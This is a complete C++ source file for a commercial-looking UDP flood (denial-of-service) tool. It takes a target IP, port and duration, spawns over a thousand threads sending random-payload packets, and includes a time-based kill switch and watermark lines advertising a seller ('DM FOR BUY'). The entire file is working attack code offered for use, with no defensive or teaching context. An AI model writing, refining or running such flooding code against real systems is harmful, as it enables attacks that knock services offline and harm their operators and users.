#include <iostream>
#include <thread>
#include <vector>
#include <atomic>
#include <csignal>
#include <cstring>
#include <ctime>
#include <chrono>
#include <random>
#include <sstream>
#include <algorithm>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/types.h>

#define MAX_THREADS 1200 // Increased thread count
#define MAX_BUFFER_SIZE 9999999 // Maximum buffer size
#define PAYLOAD_SIZE 2048 // Payload size for the old attack

#define EXPIRATION_YEAR 2025
#define EXPIRATION_MONTH 10
#define EXPIRATION_DAY 30

struct ThreadData {
    std::string ip;
    int port;
    int duration;
    int thread_id;
};

struct thread_data {
    char ip[16];
    int port;
    int time;
};

std::atomic<bool> stop_flag(false);

void handle_signal(int sig) {
    stop_flag = true;
}

// Old xor-shift PRNG
uint32_t xorshift32() {
    static thread_local uint32_t state = 123456789;
    state ^= state << 13;
    state ^= state >> 17;
    state ^= state << 5;
    return state;
}

// Old super packet generator (partial concept)
void create_super_packet(char *buffer, int buffer_size) {
    for (int i = 0; i < buffer_size; ++i) {
        buffer[i] = static_cast<char>(xorshift32() % 256);
    }
}

int get_super_packet_size() {
    int rand_value = xorshift32() % 100;
    if (rand_value < 31) return (xorshift32() % 20) + 64;
    else if (rand_value < 39) return (xorshift32() % 20) + 128;
    else if (rand_value < 48) return (xorshift32() % 18) + 256;
    else if (rand_value < 55) return (xorshift32() % 16) + 512;
    else if (rand_value < 67) return (xorshift32() % 12) + 600;
    else if (rand_value < 84) return (xorshift32() % 38) + 700;
    else if (rand_value < 94) return (xorshift32() % 22) + 800;
    else if (rand_value < 97) return (xorshift32() % 34) + 900;
    else if (rand_value < 99) return (xorshift32() % 38) + 1000;
    else return (xorshift32() % 34) + 1024;
}

// Original payload generator (hex escaped)
void generate_payload(char *buffer, size_t size) {
    static const char *hex_chars = "0123456789abcdef";
    for (size_t i = 0; i < size; i++) {
        buffer[i * 4] = '\\';
        buffer[i * 4 + 1] = 'x';
        buffer[i * 4 + 2] = hex_chars[rand() % 16];
        buffer[i * 4 + 3] = hex_chars[rand() % 16];
    }
    buffer[size * 4] = '\0';
}

// New realtime random payload generator with embedded hex timestamp
void generate_realtime_payload(char *buffer, size_t size) {
    static thread_local std::mt19937 rng(std::chrono::steady_clock::now().time_since_epoch().count());
    std::uniform_int_distribution<> dist(0, 255);

    for (size_t i = 0; i < size; ++i) {
        buffer[i] = static_cast<char>(dist(rng));
    }

    auto now = std::chrono::system_clock::now();
    auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(now.time_since_epoch()).count();
    std::stringstream ss;
    ss << std::hex << ms;
    std::string time_str = ss.str();

    size_t embed_len = std::min(time_str.size(), size);
    for (size_t i = 0; i < embed_len; ++i) {
        buffer[i] = time_str[i];
    }
}

// Old attack function (as in original code)
void *attack_old(void *arg) {
    struct thread_data *data = (struct thread_data *)arg;
    int sock;
    struct sockaddr_in server_addr;
    time_t endtime;

    char payload[PAYLOAD_SIZE * 4 + 1];
    generate_payload(payload, PAYLOAD_SIZE);

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip);

    endtime = time(NULL) + data->time;

    while (time(NULL) <= endtime && !stop_flag) {
        ssize_t payload_size = strlen(payload);
        if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
            perror("Send failed");
            break;
        }
    }

    close(sock);
    pthread_exit(NULL);
}

// New attack function with realtime random payload, random local source port
void *attack_realtime(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    int sock;
    struct sockaddr_in server_addr;
    struct sockaddr_in local_addr;

    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Bind to random ephemeral port (non-sudo)
    memset(&local_addr, 0, sizeof(local_addr));
    local_addr.sin_family = AF_INET;
    local_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    local_addr.sin_port = htons(0);

    if (bind(sock, (struct sockaddr *)&local_addr, sizeof(local_addr)) < 0) {
        perror("Bind failed");
        close(sock);
        pthread_exit(NULL);
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(data->port);
    server_addr.sin_addr.s_addr = inet_addr(data->ip.c_str());

    time_t endtime = time(NULL) + data->duration;

    size_t payload_size = 1024; // example powerful payload size
    char *payload = new char[payload_size];

    while (time(NULL) <= endtime && !stop_flag) {
        generate_realtime_payload(payload, payload_size);

        ssize_t sent_bytes = sendto(sock, payload, payload_size, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (sent_bytes < 0) {
            perror("Send failed");
            break;
        }
    }

    delete[] payload;
    close(sock);
    pthread_exit(NULL);
}

// Super UDP flood - retained from original but simplified for clarity
void super_udp_flood(const ThreadData &data) {
    int sockfd;
    struct sockaddr_in target;

    char *buffer = new char[MAX_BUFFER_SIZE];
    if (!buffer) {
        std::cerr << "Buffer allocation failed" << std::endl;
        return;
    }

    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sockfd < 0) {
        perror("Socket creation failed");
        delete[] buffer;
        return;
    }

    int buff_size = 10 * 1024 * 1024; // 10MB
    if (setsockopt(sockfd, SOL_SOCKET, SO_SNDBUF, &buff_size, sizeof(buff_size)) < 0) {
        perror("Failed to set socket send buffer size");
        close(sockfd);
        delete[] buffer;
        return;
    }

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(data.port);
    if (inet_pton(AF_INET, data.ip.c_str(), &target.sin_addr) <= 0) {
        perror("Invalid target IP address");
        close(sockfd);
        delete[] buffer;
        return;
    }

    time_t end_time = time(nullptr) + data.duration;
    int failed_sends = 0;
    const int max_errors = 10;

    srand(time(nullptr) + data.thread_id);

    while (time(nullptr) < end_time && !stop_flag) {
        int iteration_count;
        int buffer_size;

        int pattern_choice = xorshift32() % 5;
        switch (pattern_choice) {
            case 0:
                iteration_count = (xorshift32() % 4000) + 3000;
                buffer_size = get_super_packet_size();
                break;
            case 1:
                iteration_count = (xorshift32() % 3000) + 2000;
                buffer_size = (xorshift32() % 128) + 64;
                break;
            case 2:
                iteration_count = (xorshift32() % 2500) + 2000;
                buffer_size = get_super_packet_size();
                break;
            case 3:
                iteration_count = (xorshift32() % 1500) + 1000;
                buffer_size = (xorshift32() % 256) + 64;
                break;
            default:
                iteration_count = (xorshift32() % 3000) + 2000;
                buffer_size = get_super_packet_size();
                break;
        }

        for (int i = 0; i < iteration_count; ++i) {
            create_super_packet(buffer, buffer_size);
            if (sendto(sockfd, buffer, buffer_size, 0, (struct sockaddr *)&target, sizeof(target)) < 0) {
                ++failed_sends;
                if (failed_sends >= max_errors) {
                    std::cerr << "Thread " << data.thread_id << ": Adjusting due to too many sendto failures." << std::endl;
                    iteration_count /= 2;
                    break;
                }
            }
        }
    }

    if (failed_sends > 0) {
        std::cerr << "Thread " << data.thread_id << ": " << failed_sends << " sendto failures occurred." << std::endl;
    }

    close(sockfd);
    delete[] buffer;
}

void check_expiration() {
    time_t now;
    struct tm expiration_date = {0};
    expiration_date.tm_year = EXPIRATION_YEAR - 1900;
    expiration_date.tm_mon = EXPIRATION_MONTH - 1;
    expiration_date.tm_mday = EXPIRATION_DAY;

    time(&now);

    if (difftime(now, mktime(&expiration_date)) > 0) {
        printf("This file is closed by @MoinOwner.\nJOIN CHANNEL TO USE THIS FILE. @MOINCRACKS\n");
        exit(EXIT_FAILURE);
    }
}

int main(int argc, char *argv[]) {
    check_expiration();

    if (argc != 4) {
        std::cerr << "Usage: " << argv[0] << " <IP> <PORT> <TIME>" << std::endl;
        return 1;
    }

    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);
    signal(SIGHUP, handle_signal);
    signal(SIGQUIT, handle_signal);

    std::string ip = argv[1];
    int port = std::stoi(argv[2]);
    int duration = std::stoi(argv[3]);
    int num_threads = MAX_THREADS;

    std::cout << "Flood started to " << ip << ":" << port << " with " << num_threads << " threads for " << duration << " seconds." << std::endl;
    std::cout << "WATERMARK: THIS BOT PROVIDED BY @MOINCRACKS\nDM FOR BUY : @MoinOwner" << std::endl;

    std::vector<std::thread> threads;
    threads.reserve(num_threads + 10);

    // Launch super_udp_flood threads
    for (int i = 0; i < num_threads; ++i) {
        ThreadData data{ip, port, duration, i};
        threads.emplace_back(super_udp_flood, data);
    }

    // Launch old attack threads (10 threads for demonstration)
    thread_data attack_data{};
    strncpy(attack_data.ip, ip.c_str(), 15);
    attack_data.port = port;
    attack_data.time = duration;

    for (int i = 0; i < 10; ++i) {
        threads.emplace_back(attack_old, &attack_data);
    }

    // Launch new realtime attack threads (10 threads)
    for (int i = 0; i < 10; ++i) {
        ThreadData data{ip, port, duration, i};
        threads.emplace_back(attack_realtime, &data);
    }

    for (auto &th : threads) {
        if (th.joinable())
            th.join();
    }

    return 0;
}
